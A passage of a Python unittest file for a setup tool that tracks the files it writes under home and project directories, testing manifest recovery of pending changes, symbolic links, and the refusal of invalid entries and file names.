    def test_a_removal_below_what_is_setups_link_now_was_made(self) -> None:
        """The path lies under setup's link into the clone, where the disk
        shows the clone's own file of that name: the user's file is gone,
        and its entry must not be."""
        skill = self.world.home / ".claude" / "skills" / "json-tools"
        self.assertEqual(fsio.look(skill).kind, fsio.LINK)
        self.assertEqual((skill / "SKILL.md").read_bytes(), b"the clone's own\n")
        data = self.data(self.home_file)
        key = "home:.claude/skills/json-tools/SKILL.md"
        entry = data["entries"].pop(key)
        self.assertEqual(entry["kind"], "removed-file")
        data["pending"] = [{"path": key, "after": {"kind": "absent"}, "set": True, "entry": entry, "backup": None}]
        self.write(self.home_file, data)
        record = fileops.read_record(self.roots)
        self.assertEqual((record.recovered_paths, record.dropped), ([key], 0))
        self.assertEqual(record.get(key), entry)

    def test_a_link_of_the_users_is_read_through(self) -> None:
        """With the option that follows links, a file is written where the
        user's link leads; that it was written is read there too."""
        if not hasattr(os, "symlink") and os.name != "nt":
            self.skipTest("needs a link")
        real = self.world.home / "dotfiles"
        real.mkdir()
        fsio.make_link(str(real), self.world.home / "linked", True)
        (real / "made.md").write_bytes(b"generated\n")
        self.pending({
            "path": "home:linked/made.md", "after": {"kind": "file", "sha256": digest(b"generated\n")}, "set": True,
            "entry": {"kind": "file", "sha256": digest(b"generated\n"), "inputs": None, "original": None}, "backup": None,
        })
        record = fileops.read_record(self.roots)
        self.assertEqual(record.recovered_paths, ["home:linked/made.md"])

    def test_a_change_under_a_root_this_run_was_not_given_stays_pending(self) -> None:
        item = {"path": "other:x.md", "after": {"kind": "absent"}, "set": True, "entry": None, "backup": None}
        self.pending(item)
        record = fileops.read_record(self.roots)
        self.assertEqual((record.recovered, record.dropped, record.home.pending), (0, 0, [item]))
        # A run that writes keeps it for a run that has the root.
        plan = self.world.plan()
        plan.write_file(self.world.home / "new.md", "x\n")
        plan.apply()
        self.assertEqual(self.data(self.home_file)["pending"], [item])
        self.assertFalse(fileops.remove_state(self.roots))


class WhatSetupSavesTests(RecordCase):
    def test_a_record_setup_writes_is_one_it_reads(self) -> None:
        for file, scope in ((self.home_file, HOME), (self.project_file, PROJECT)):
            manifest = Manifest.load(file, scope)
            self.assertIsNone(manifest.fault())
            self.assertGreater(len(manifest.entries), 3)
        # Every kind of entry, backup and pending change is among them.
        kinds = {entry["kind"] for file in (self.home_file, self.project_file) for entry in self.data(file)["entries"].values()}
        self.assertLessEqual({"directory", "link", "file", "text", "json", "removed-file"}, kinds)

    def test_a_record_that_would_be_refused_is_never_saved(self) -> None:
        manifest = Manifest.load(self.home_file, HOME)
        manifest.entries["home:../x"] = {"kind": "directory"}
        before = self.home_file.read_bytes()
        with self.assertRaises(SetupError) as caught:
            manifest.save()
        self.assertIn("the record cannot be saved: entry home:../x", caught.exception.lines[0])
        self.assertEqual(self.home_file.read_bytes(), before)

    @unittest.skipUnless(os.name == "posix", "a ':' or a '\\' in a file's name is a POSIX matter")
    def test_a_name_the_record_cannot_hold_is_found_before_anything_is_written(self) -> None:
        before = tree(self.top)
        for name in ("a:b.md", "a\\b.md"):
            plan = self.world.plan()
            plan.write_file(self.world.home / ".claude" / "agents" / name, "x\n")
            with self.assertRaises(fileops.PlanError) as caught:
                plan.apply()
            self.assertEqual(caught.exception.codes(), {fileops.OUTSIDE})
            self.assertIn("a name the record cannot hold", caught.exception.lines[0])
        self.assertEqual(differences(before, tree(self.top)), [])


if __name__ == "__main__":
    unittest.main()
